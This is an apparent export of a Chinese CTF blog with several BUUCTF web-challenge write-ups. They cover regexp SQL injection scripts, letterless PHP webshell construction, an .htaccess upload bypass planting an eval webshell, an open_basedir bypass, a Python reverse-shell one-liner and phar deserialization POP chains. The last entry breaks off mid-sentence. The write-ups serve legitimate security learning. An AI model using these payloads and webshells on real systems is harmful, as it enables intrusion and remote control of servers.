    <content type="text"><![CDATA[考点sql注入（regexp注入） 前置知识regexp注入 在sql语句中 select database(); // 是输出当前打开的是数据库名 select database() regexp”^d”; // 这样可以匹配数据库名的开头是 d 是就会返回 1 不是则返回0 当sql语句是这样 select * from users where user=’’||password; 可以看到出来两条数据，至于为什么会出来两条数据，我很好奇，按理说 &#39;&#39;||password 为逻辑运算，结果 只能为1 或者 0 ，当user =0/1的时候，并没有字段能够满足，但还是查询出来两条数据？？？先不纠结这个，做题要紧。 接下来 可以通过 &#39;&#39;||passwor dregexp&quot;^8d&quot; 的方式 不断匹配出数据当中 password的值。 这个就是regexp注入。 解题过程打开 一个登录页面，还显示了提交的sql语句。 dirsearch扫目录1python3 dirsearch.py -u &quot;http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/&quot; -x 404,429 -s 1 可以得到一些提示信息，打开 robots.txt 实际上提示的就是 hint.txt 可以发现过滤了很多关键字，提示信息说只需要找到admin的密码 提交，然后就能拿到flag。 这种题我也没做过，直接跟随大佬的脚步，看了wp，regexp注入。 首先构造payload。 1username=\&amp;passwd=||passwd/**/regexp&quot;^y&quot;;%00 为什么要这么构造呢？ 1234567891011页面上回显的sql语句select * from users where username=&apos;&apos; and passwd=&apos;&apos;我们通过username 传入 \ 这样可以把&apos;转义掉 变成这样select * from users where username=&apos;\&apos; and passwd=&apos;&apos;此时的 \&apos; and passwd=&apos; 就成了 username的值在通过传入 passwd 传入 ||passwd/**/regexp&quot;^y&quot;;%00select * from users where username=&apos;\&apos; and passwd=&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos;就和前置知识类似了select * from users where username=&apos;&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos; 后边的%00相当于截断了后边的字符，看了下php 对应版本为 5.2.16,存在截断漏洞，接下来只需要遍历 regexp&quot;^x&quot; 中的 x即可 python写脚本1234567891011121314151617181920212223242526272829import requestsfrom urllib import parseurl = "http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/"# 构造字典dict_list = [ i for i in range(97,123)]shuzi = [i for i in range(48,58)]dict_list +=shuzidict_list.append(95)flag = ''for i in range(50): for j in dict_list: payload = '||passwd/**/regexp"^%s";\x00'%(flag+chr(j)) datas = &#123; 'username': '\\', 'passwd': payload &#125; print(datas) import time time.sleep(1) res = requests.post(url=url,data=datas) # print(res.text) if 'welcome.php' in res.text : flag += chr(j) print("[+] "+flag) break 容易跑到一半就报错，直接把得到的结果手动拼上去继续跑 得到 1you_will_never_know7788990 提交 1username=&amp;passwd=you_will_never_know7788990 总结这道题，又让我学到了sql注入的一种新姿势。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入(regexp注入)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【BSidesCF 2019】Cookie 1]]></title>
    <url>%2F2021%2F08%2F24%2F%5BBSidesCF%202019%5DCookie%201%2F</url>
    <content type="text"><![CDATA[考点：Cookie伪造打开 两个提示信息 123 Log in as admin!We found the account cookie / monster 我以为多难，就只是伪造一下cookie。刚开始测试了sql注入，没反应。又用dirsearch扫了目录，翻了源代码。 这里提到了cookie，伪造Cookie，直接回显了flag。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Cookie伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【b01lers2020】Welcome to Earth 1]]></title>
    <url>%2F2021%2F08%2F24%2F%5Bb01lers2020%5DWelcome%20to%20Earth%201%2F</url>
    <content type="text"><![CDATA[考点burp抓包 F2源代码分析 解题过程打开一个页面，只显示了几个单词。 隔了几秒钟，跳转到 /ded/这个页面 bp启动。 经过分析，当event.keyCode == 27会跳转到 /chase/，那为什么不手动跳转？ 跳转 /leftt/ 点击 continue 打开 /open/ 得到 /fight/ 最后得到 我以为这里肯定很深奥，但是我想半天也没想明白，这个 scrable 函数到底起什么作用，我看了别人wp，只不过是障眼法，flag只需要把 check_action里的 flag 组合出来就行。 getflagpy一下，上脚本 123456789101112from itertools import permutationsimport reflag = ["&#123;hey", "_boy", "aaaa", "s_im", "ck!&#125;", "_baa", "aaaa", "pctf"]# 对flag字典里的内容进行排列组合item = permutations(flag)# 遍历for a in item: k = ''.join(list(a)) # 匹配 if re.search('^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$', k): print(k) 得到 第三个就是。 总结这道题没我想象中那么复杂，确实没有什么难度，唯一学到的知识点，就是知道了一个排列组合的库 from itertools import permutations，这道题排在第三页，越往后做起的人越少，也越来越难，有点摸不着头脑。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SUCTF 2019】EasyWeb 1]]></title>
    <url>%2F2021%2F08%2F23%2F%5BSUCTF%202019%5DEasyWeb%201%2F</url>
    <content type="text"><![CDATA[考点无字符webshell构造 文件上传 （.htaccess 绕过后缀检测） open_basedir/disable_function绕过 前置知识构造无字母webshell的三种方式1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; 在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。 异或如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。 演示 1234567891011121314151617构造 phpinfo p:%FF^%8Fo:%FF^%90n:%FF^%91i:%FF^%96h:%FF^%97f:%FF^%99$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();在php5 可以用assert 函数 php7 不能php5 下$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);// assert$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); //_POST$___=$$__; //$_POST$_($___[_]); //assert($_POST[_])POST _=phpinfo(); 生成脚本 python 123456789101112import urllib.parsefind = ['p','h','i','n','f','o']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print("%s:%s^%s"%(result,a,b)) php 12345678910111213141516171819$l = "";$r = "";$argv = str_split("_GET");for ($i = 0; $i &lt; count($argv); $i++) &#123; for ($j = 0; $j &lt; 255; $j++) &#123; $k = chr($j) ^ chr(255); // dechex(255) = ff if ($k == $argv[$i]) &#123; if ($j &lt; 16) &#123; $l .= "%ff"; $r .= "%0" . dechex($j); continue; &#125; $l .= "%ff"; $r .= "%" . dechex($j); continue; &#125; &#125;&#125;echo "\&#123;$l`$r\&#125;"; 取反参考 与异或类似，不过它利用的是 UTF-8 编码中的某个汉子 , 将其中的某个字符提取出来 , 进行取反后得到对应字符 生成步骤 找到 “p“ 对应的 ASCII码，拿到对应的十六进制编码 70 在前面添加两个十六进制数 . 这个数是任意的 . 然后将它取反 . 在线 比如这里用 7B，然后就行取反。 将取反后的数字写成 NCR 格式( &amp;#x … ) , 并且将它转换为中文字符 在线 &amp;#x848f 带入代码测试 , 取第二个字符( 第一个字符是你任意添加的 ) , 即可得到需要的字符 示范 构建 phpinfo 进行测试 p h i n f o 对应的 十六进制编码 70 68 69 6e 66 6f 加入 7b 取反 原字符 十六进制 取反 转为字符 p 7b70 848F 蒏 h 7b68 8497 蒗 i 7b69 8496 蒖 n 7b6e 8491 蒑 f 7b66 8499 蒙 o 7b6f 8490 蒐 12345678910111213141516171819202122232425262728&lt;?php$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //2$__='';$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒗";$__.=~($___&#123;$_&#125;);$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒖";$__.=~($___&#123;$_&#125;);$___="蒑";$__.=~($___&#123;$_&#125;);$___="蒙";$__.=~($___&#123;$_&#125;);$___="蒐";$__.=~($___&#123;$_&#125;);// phpinfo();$__();p神的例子 $__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);POST 2=phpinf(); 注意事项：这个写在php文件中能直接运行，通过GET传参就报错 eval()&#39;d code:1 Stack trace:，经过多次测试，需要进行url编码提交才不会报错。 递增运算得到对应字符这个就直接上代码，方式不一样，目的一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364p神案例 // ASSERT($_POST[_]); 这个仅支持 php5 php7 需要更换assert 为其他代码执行函数 &lt;?php $_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); POST _=phpinfo();// 自己构造的命令执行 (SYSTEM)($_POST[_]); 函数自调用 需要php7.0 以上&lt;?=$_=[]?&gt;&lt;?=$_="$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$______=$__++?&gt;&lt;?=$_______=$__++?&gt;&lt;?=$__++?&gt; &lt;?=$__++?&gt;&lt;?=$________=$__++?&gt;&lt;?=$_________________=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__________=$__++?&gt;&lt;?=$_________=$________.$__________.$________.$_________________.$____.$_____?&gt;&lt;?=($_________)($&#123;'_'.$_______.$______.$________.$_________________&#125;[_])?&gt; // 可做免杀马 不能直接POST提交 会报 Parse error: syntax error, unexpected '&lt;', expecting end of file in// 编码也没用 绕过 open_basedir/disable_function open_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。 payload 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;)); 也可以用蚁剑 disable_functions 插件绕过 解题过程打开得到一份代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! # 构建路径 $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; # 创建路径 mkdir($userdir); &#125; # 判断文件是否上传 if(!empty($_FILES["file"]))&#123; # 拿到上传的临时文件名 $tmp_name = $_FILES["file"]["tmp_name"]; # 拿到文件名 $name = $_FILES["file"]["name"]; # 拿到后缀 $extension = substr($name, strrpos($name,".")+1); # 后缀不能存在 ph if(preg_match("/ph/i",$extension)) die("^_^"); # 文件内容不能存在 &lt;? if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die("^_^"); # 通过文件头判断是否为常见的图片文件类型 if(!exif_imagetype($tmp_name)) die("^_^"); $path= $userdir."/".$name; # 将文件保存到刚刚创建的路径下 @move_uploaded_file($tmp_name, $path); # 输出路径 print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;# 传入字符长度不能大于18if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;# 不能有字母数字以及一些其他字符# 无字母webshell 不能用取反来构造if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die("Almost there!");# 代码执行 调用get_the_flageval($hhh);?&gt; 代码审计通过审计，getshell可以分为两个步骤，第一步，先绕过条件 if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\反引号~_&amp;.,|=[\x7F]+/i&#39;, $hhh) ) ，这个条件通过 异或的方式构造无字母webshell绕过。第二步：需要绕过三个条件，分别是 if(preg_match(&quot;/ph/i&quot;,$extension))，后缀不能带有ph。if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False)，文件内容中不能存在 &lt;?。if(!exif_imagetype($tmp_name)) ，文件头必须是常见图片类型文件头。绕过方式：通过上传.htaccess文件，在.htaccess文件中，需要伪造图片头来过第三个条件的检测 ，通常我们会想到GIF89a来绕过，但是这样会让.htaccess文件不能生效，这时可以通过 在.htaccess 头部添加#define width 1337 #define height 1337 绕过。然后再上传头部带有GIF89a、后缀名为jpg的一句话。 第一步 通过异或构造无字母webshell 1234567891011// $&#123;_GET&#125;&#123;_&#125;(); // 通过上面给的脚本 分别用 _ G E T 来作为异或目标// 得到_:%FF^%A0T:%FF^%ABG:%FF^%B8E:%FF^%BA// 组装$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();// phpinfo 测试$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=phpinfo 没有问题，也可以直接执行get_the_flag。 第二步 上脚本 再进行.htaccess 文件内容构建的时候，需要知道文件上传的路径，路径的构建规则,upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])，得到 upload/tmp_532fb014387262fa08e25fd65663cac2。 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则 123456789101112131415161718192021222324import requestshtaccess = b"""#define width 1337#define height 1337AddType application/x-httpd-php .jpgphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpg""""# 这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则shell = "GIF89a"+"aa"+"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="# &lt;?php eval($_POST['cmd']);?&gt;url = 'http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%A0&#125;();&amp;%A0=get_the_flag'# print(url)# 上传 .htaccess files = &#123;'file':('.htaccess', htaccess, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text)# 上传shellfiles = &#123;'file':('shell.jpg', shell, 'image/jpeg')&#125;data = &#123;'upload':'submit'&#125;res = requests.post(url=url, data=data, files=files)print(res.text) 执行 getshell蚁剑连接 但是不能跳转到其他目录，使用蚁剑的disable_functions插件，辅助工具-&gt;绕过disable_functions-&gt;选择模式-&gt;PHP7_GC_UAF 。 手动绕过open_basedir payload123url: http://3cd358ce-4a9b-430d-b949-13b4c50642f0.node4.buuoj.cn:81/upload/tmp_532fb014387262fa08e25fd65663cac2/shell.jpgPOSTcmd=chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;)); 总结用无字母webshell的方式绕过正则对字母数字的匹配，通过上传.htaccess的方式绕过对正则对后缀的匹配，.htaccess为什么上传这个文件就能让上传的图片当做php文件执行呢？ 实际上就是apache的一个配置文件，也就是只有服务器是apache的时候可以这样做，nginx就不行。 而 AddType 这个参数可以为当前目录下的 指定的后缀名添加MIME类型。 刚刚我们设置的 AddType application/x-httpd-php .jpg 就是把.jpg后缀的MIME类型设置为 application/x-httpd-php，服务器去读取.jpg文件的时候会把它当成php文件读取，所以，里面的一句话就能执行。 学到了不少。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件上传</tag>
        <tag>preg_match绕过</tag>
        <tag>open_basedir/disable_function绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【网鼎杯 2020 白虎组】PicDown 1]]></title>
    <url>%2F2021%2F08%2F22%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown%201%2F</url>
    <content type="text"><![CDATA[考点文件包含（python） 代码审计（python） 命令执行（python） 前置知识python反弹shell1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 解题过程打开 就一个输入框，提交数据后会跳转到page页面，请求参数名为url，感觉像ssrf，其实不是，但还是可以通过传入 url链接去读取网页源代码，并且返回为 一个名为 beautiful.jpg的文件，用文本打开实际上是个网页。 尝试包含 /etc/passwd 也成功包含出来。 非预期解这里直接尝试包含了下 /flag ,发现直接包含了出来。 预期解接下来通过读取 /proc/self/cmdline 来查看当前进程的执行命令 读取 app.py，得到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = "/tmp/secret.txt"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index(): return render_template('search.html')@app.route('/page')def page(): url = request.args.get("url") try: # url参数值中不能以字符 file 开头 if not url.lower().startswith("file"): # 打开url res = urllib.urlopen(url) # 读取 value = res.read() # 返回 response = Response(value, mimetype='application/octet-stream') response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg' return response else: value = "HACK ERROR!" except: value = "SOMETHING WRONG!" return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager(): key = request.args.get("key") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get("shell") # 执行命令 os.system(shell) res = "ok" else: res = "Wrong Key!" return resif __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 代码审计通过审计，发现在manager函数中存在命令执行，有一个条件，没有过滤。 1if key == SECRET_KEY: 传入的 key 要等于 SECRET_KEY，那么这个SECRET_KEY 要怎么获取呢。 1234SECRET_FILE = "/tmp/secret.txt"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE) 通过上面代码可以知道，从/tmp/secret.txt 中读取到SECRET_KEY后就会把这个文件删除，这就会导致我们读取不到。 Linux当中，文件只要没有关闭，就会读取到内存当中，就算是remove也是一样，打开的文件存在/proc/[pid]/fd路径下，这个路径下有很多以数字保存的文件，例如 /proc/self/fd/1这样。 bp启动，爆破。 得到 getshell1234567key = request.args.get("key") print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get("shell") # 执行命令 os.system(shell) res = "ok" 拿到看KEYCRET_KEY，就可以执行命令了，但是这里即便执行成功，也只会返回ok，这里我们用python反弹shell。 先在服务器当监听 构造payload 1no_one_know_the_manager?key=TdCTIhB6KGIVLP1AYx623LPgIFlKIZeXjQEIecV1ZtA=&amp;shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' url编码 1python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22IP%22,PORT));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'%0A 提交，在根目录下。 总结这道题没什么难度，考得都很是常识，但我就是偏偏不会，通过读取 /proc/self/cmdline 来查看当前进程的执行命令，通过读取/proc/self/fd/1 查看在内存中的文件，学到了学到了。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含(Python)</tag>
        <tag>代码审计(Python)</tag>
        <tag>命令执行(Python)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【SWPUCTF 2018】SimplePHP 1]]></title>
    <url>%2F2021%2F08%2F22%2F%5BSWPUCTF%202018%5DSimplePHP%201%2F</url>
    <content type="text"><![CDATA[考点代码审计 反序列化（phar反序列化 和 pop链构造） 前置知识phar反序列化的三个前提条件 可以上传phar文件 有可以利用的魔术方法 文件操作函数的参数可控 phar文件生成1234//生成phar文件前需要配置php.ini[Phar]; http://php.net/phar.readonlyphar.readonly = On 改成 Off 1234567891011// 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');// $c1 就是要反序列化的对象$phar-&gt;setMetadata($c1);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering(); 可以代替unserialize 进行反序列化操作的函数 fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen fileinode filemtime fileowner fikeperms is_dir is_executable is_file is_link is_readable is_writable is_writeable parse_ini_file copy unlink stat readfile 魔法方法 __destruct 类对象被删除时自动调用，反正只要创建对象，都会自动调用一次 __toString 使用 echo 或者 print 进行输出时 就会自动调用 __get 读取不可访问（protected 或 private）或不存在的属性的值时会自动调用 pop链构造 1、找到可利用的地方，比如，文件包含，命令执行等地方 2、从可以利用地方回溯到可控制的地方，找到一个链条。 3、更改属性内容，先进行序列化，看看能不能达到目的。 4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码 解题过程打开两个基本的功能，文件上传和查看文件 当然，首先联想到的就是，上传图片马，文件包含getshell，事实上想太简单了，文件包含直接输出字符串，就像这样。 经过多次尝试，文件上传只能上传gif,jpg这几中文件，白名单，上传路径为/upload。文件包含只能包含，/var/www/html目录下的文件，可以包含出源代码。 获取源码放两个关键点的代码 file.php 12345678910111213141516171819202122&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);include &apos;function.php&apos;;include &apos;class.php&apos;;ini_set(&apos;open_basedir&apos;,&apos;F:\Code\PHP\Poc\Serializer\phar\web3&apos;);$file = $_GET[&quot;file&quot;] ? $_GET[&apos;file&apos;] : &quot;&quot;;if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123; # 将$_GET[&apos;file&apos;]得到的值 赋值给 $show-&gt;source $show-&gt;source = $file; // $show-&gt;source = new Test(); # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件 $show-&gt;_show();&#125; else if (!empty($file))&#123; die(&apos;file doesn\&apos;t exists.&apos;);&#125;?&gt; class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.phar echo $this-&gt;source; // 会触发 __toString 方法 &#125; public function __toString() &#123; # $this-&gt;&gt;str = new C1e4r(new Test())// echo "__toString"; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; # 反序列化会触发 public function __wakeup() &#123; if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker~"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; # __get()，获得一个类的成员变量时调用 # public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = "index.php"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125; 代码审计通过审计可以得知，这道题是phar反序列化，触发点可以不用是unserialize，找到一个能够触发反序列的关键函数file_exists ，这里的$file变量可控。 file.php 中 123456789101112# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123; # 将$_GET['file']得到的值 赋值给 $show-&gt;source $show-&gt;source = $file; // $show-&gt;source = new Test(); # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件 $show-&gt;_show();&#125; else if (!empty($file))&#123; die('file doesn\'t exists.');&#125; pop链构造从file.php 文件中找到了反序列化触发点，接下来就要找到一个可以利用的点。 在class.php 中 Test类中的一个方法。 123456public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125; 简化class.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.phar echo $this-&gt;source; // 会触发 __toString 方法 &#125; public function __toString() &#123; # $this-&gt;&gt;str = new C1e4r(new Test())// echo "__toString"; $content = $this-&gt;str['str']-&gt;source; return $content; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; # __get()，获得一个类的成员变量时调用 # public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = "index.php"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; # 读取flag $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125; 接下来从class.php 文件中的 几个类中构建出 pop链。 1C1e4r::__destruct-&gt;Show::__toString-&gt;Test::__get 构造pop链要从可以利用的地方放回构建。 首先Test类中要调用__get方法，那么类方法中必须调用一个不存在的属性或者私有属性，在Show类中的__toString方法中，有这么一句 $content = $this-&gt;str[&#39;str&#39;]-&gt;source; ，我们让$this-&gt;str[&#39;str&#39;] 为 Test类，那么 调用的就是 $content = Test-&gt;source;，就会触发Test类调用__get，__get中会调用get方法，get方法又会调用file_get，然后执行到file_get_contents。那要怎么才能让__toString执行呢，在C1e4r类中有一个__destruct方法，这个方法有一句 echo $this-&gt;test; ,echo则会触发__toString的执行，所以我们要让$this-&gt;test 为 $this-&gt;test = new Show() ，但是这里还不能这样做，在C1e4r中的__destruct方法中 